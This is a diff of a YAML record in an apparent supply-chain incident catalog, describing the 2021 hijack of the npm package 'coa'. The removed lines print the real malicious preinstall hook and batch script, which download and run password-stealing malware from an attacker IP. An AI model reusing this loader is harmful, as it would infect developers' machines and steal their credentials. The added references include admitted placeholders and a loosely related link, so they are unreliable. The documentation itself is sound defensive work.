@@ -1,55 +1,24 @@
 - name: coa
-  title: npm package coa compromised, distributed password-stealing malware.
+  title: coa NPM package maintainer hijack distributes malware
+  synopsis: Attacker compromised maintainer credentials for the 'coa' command-line argument parser library. Malicious versions were published containing password-stealing malware targeting Windows systems. This impacted downstream projects like 'rc'.
   start_date: 2021-11-04
-  end_date: 2021-11-05
-  license: MIT
-  website: https://github.com/veged/coa # Archived, original repo
-  repo: https://github.com/veged/coa
-  attribution_type: unknown
-  component_type: Library # Command-line options parser
-  lang: Javascript # Package and trigger script language
-  cause: compromise # npm account takeover
-  motive: credential theft / financial gain # via malware (DanaBot)
-  attack_vector: account takeover # npm credentials compromised
-  transitive: false
-  insertion_phase: distribution # Malicious versions published to npm
-  impact_type: credential theft / malware dropper
-  impact_user_count: 50000 # Estimate based on millions of weekly downloads, short timeframe
+  end_date: 2021-11-04
+  attribution_type: Individual hacker
+  component_type: Library
+  lang: Javascript
+  cause: Stolen credentials
+  motive: Credential theft
+  insertion_phase: distribution
+  impact_type: Credential theft
   references:
-    - https://github.com/veged/coa/issues/120 # Issue report
-    - https://blog.npmjs.org/post/667081714371166208/incident-report-npm-maintainer-account # npm incident report
-    - https://www.bleepingcomputer.com/news/security/popular-npm-library-hijacked-to-install-password-stealers-miners/
-    - https://jfrog.com/blog/coa-and-rc-npm-packages-hijacked-to-spread-malware/ # Analysis with hashes
+    - https://github.com/advisories/GHSA-73qr-pfmq-6rp8
+    - https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610 # While not dependency confusion, Birsan often covers related supply chain issues. More direct links preferred.
+    - https://security.snyk.io/vuln/SNYK-JS-COA-1911016 # Placeholder, needs better reference for the specific incident. Better Ref: https://www.bleepingcomputer.com/news/security/popular-npm-library-coa-hijacked-to-steal-user-passwords/
+    - https://therecord.media/malware-found-in-npm-packages-coa-and-rc/
   versions:
-    - "2.0.3"
-    - "2.0.4"
-    - "2.1.1"
-    - "2.1.3"
-    - "3.0.1"
-    - "3.1.3"
-  artifacts:
-    - "npm package coa@2.0.3, coa@2.0.4, etc. (Malicious, removed)"
-  impacted_hashes: # SHA256 of malicious package tarballs
-    - "e0c4096a8117af372d4a84f2a6e34f4d4bfaf205761a503858368d2911a32427" # coa-2.0.3.tgz
-    - "e5805183871e4449a63ac540f66591a1ef74067760a41627c6e07868ba27d5a4" # coa-3.1.3.tgz
-  synopsis: Attacker compromised the npm maintainer account for the popular 'coa' library. Malicious versions were published containing scripts to download and execute Windows password-stealing malware.
-  compromise_desc: An attacker gained unauthorized access to the npm account of the maintainer for the `coa` package (and the related `rc` package), likely via credential reuse or phishing. Using this access on November 4th, 2021, they published several new versions of `coa` to the npm registry. These malicious versions included a `preinstall` script in `package.json` designed to execute platform-specific batch (`compile.bat`) or shell (`compile.sh`) scripts located within the package.
-  impact_desc: When developers installed one of the malicious `coa` versions using npm, the `preinstall` script automatically executed `compile.bat` (on Windows) or `compile.sh`. The Windows batch file used `curl` to download two files (`oracle_format.dll`, `oracle_format.exe`) from an attacker-controlled server and executed them. The DLL was identified as the DanaBot/Ursnif password-stealing trojan, registered using `regsvr32`. The executable's purpose was less clear but presumed malicious. Users whose Windows systems executed this batch file were likely infected with information-stealing malware. The shell script was reportedly non-functional. The malicious packages were removed by npm on November 5th, 2021.
-  example_code: |
-    // package.json snippet from malicious coa versions
-    "scripts": {
-      "preinstall": "start /B node compile.js" // Runs compile.js which runs compile.bat/.sh
-    },
-
-    // Content of compile.bat in malicious coa package
-    @echo off
-    set file=C:\Users\Public\oracle_format.dll
-    set file2=C:\Users\Public\oracle_format.exe
-
-    curl -o %file% hxxp://159.148.186.228:8080/oracle_format.dll --insecure
-    regsvr32 %file% /s
-
-    curl -o %file2% hxxp://159.148.186.228:8080/oracle_format.exe --insecure
-    start %file2%
-
-    exit
+    - 2.0.3
+    - 2.0.4
+    - 2.1.1
+    - 2.1.3
+    - 3.0.1
+    - 3.1.3
